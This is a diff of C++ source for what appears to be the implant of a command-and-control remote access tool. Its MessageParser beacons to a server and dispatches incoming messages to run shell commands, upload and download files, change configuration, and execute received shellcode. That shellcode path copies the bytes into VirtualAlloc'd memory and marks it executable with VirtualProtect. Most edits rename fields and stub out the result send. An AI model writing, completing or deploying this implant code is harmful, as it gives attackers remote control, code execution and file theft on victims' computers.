@@ -9,6 +9,8 @@
 #include <iostream>
 #include <sstream>
 
+#include <iostream> // TODO: delete later?
+
 #include <cstdlib> // NOTE: needed to execute shell cmd
 
 
@@ -36,14 +38,26 @@ void MessageParser::start()
 	transportLayer_->beacon();
 }
 
+// handle inbound messages
 void MessageParser::handle(const RawByteBuffer& data) // TODO: change rawbytebuffer to const? 
 {
 	std::cout << "MessageParser::handle(RawByteBuffer)" << std::endl;
-}
 
-void MessageParser::handle(const InternalMessage& msg)
-{
-	std::cout << "MessageParser::handle(InternalMessage)" << std::endl;
+	// const RawByteBuffer
+	// auto decoded = encoder_->decode(data);
+	auto decoded = data; // TODO: remove
+
+	// InternalMessage
+	auto deserialized = serializer_->deserialize(decoded);
+
+	std::cout << "header = " << deserialized.header_.messageType_ << std::endl;
+
+	if (receiveCallback_)
+	{
+		receiveCallback_(deserialized);
+	}
+
+
 }
 
 bool MessageParser::executeCommand(RawByteBuffer& data)
@@ -86,22 +100,25 @@ bool MessageParser::executeCommand(RawByteBuffer& data)
 
 	// TODO: props should make a separate function for InternalMessage generation
 	InternalMessage outMsg;
-	outMsg.data = string2byte(result);
+	outMsg.data_ = string2byte(result);
 
 	MessageHeader header;
-	header.messageType = MessageType::COMMAND_RESULT;
-	header.messageId = 105; // TODO: 
-	header.dataSize = outMsg.data.size();
-	outMsg.header = header;
+	header.messageType_ = MessageType::COMMAND_RESULT;
+	header.messageId_ = 105; // TODO: 
+	header.dataSize_ = outMsg.data_.size();
+	outMsg.header_ = header;
 
-	bool sendResult = transportLayer_->sendMessage(outMsg);
-	return sendResult;
+	// TODO: 
+	// bool sendResult = transportLayer_->sendMessage(outMsg);
+	// return sendResult;
+	std::cout << "TODO: " << std::endl;
+	return false;
 }
 
 bool MessageParser::executeShellcode(InternalMessage& msg)
 {
 	std::cout << "executeShellcode" << std::endl;
-	LPVOID shellMem = VirtualAlloc(0, msg.header.dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	LPVOID shellMem = VirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!shellMem) // TODO: checking if it is NULL would be more correct?
 	{
 		// DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
@@ -110,15 +127,15 @@ bool MessageParser::executeShellcode(InternalMessage& msg)
 
 	// memcpy(beacon_mem, shellcode, bytes_received);
 	// TODO: copy 8 bytes at a time, and then copy left over
-	for (unsigned int i = 0; i < msg.header.dataSize; ++i)
+	for (unsigned int i = 0; i < msg.header_.dataSize_; ++i)
 	{
-		((char*)shellMem)[i] = msg.data[i];
+		((char*)shellMem)[i] = msg.data_[i];
 	}
 
 	// EXECUTE_READ.
 	DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
 	// NOTE: virtualProtect is also being called somewhere in the windows api
-	if (VirtualProtect(shellMem, msg.header.dataSize, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+	if (VirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
 	{
 		// Fail silently if we cannot make the memory executable.
 		return false;
@@ -317,32 +334,32 @@ bool MessageParser::handleServerError(RawByteBuffer& data)
 void MessageParser::processMessage(InternalMessage& msg)
 {
 	//systemInfo(msg);
-	switch (msg.header.messageType)
+	switch (msg.header_.messageType_)
 	{
 	case MessageType::EXECUTE_COMMAND:
-		executeCommand(msg.data);
+		executeCommand(msg.data_);
 		break;
 	
 	case MessageType::EXECUTE_SHELL_CODE:
 		executeShellcode(msg);
-		//executeShellcode(msg.data);
+		//executeShellcode(msg.data_);
 		break;
 
 	case MessageType::UPLOAD_FILE:
-		uploadFile(msg.data);
+		uploadFile(msg.data_);
 		break;
 
 	case MessageType::DOWNLOAD_FILE:
-		downloadFile(msg.data);
+		downloadFile(msg.data_);
 		break;
 
 	case MessageType::CONFIG_UPDATE:
-		updateConfig(msg.data);
+		updateConfig(msg.data_);
 		break;
 
 	case MessageType::ERROR_REPORT:
 		// Server sent an error, handle it
-		handleServerError(msg.data);
+		handleServerError(msg.data_);
 		break;
 	default:
 		std::cout << "default case, MessageType = " << msg.header_.messageType_ << std::endl;
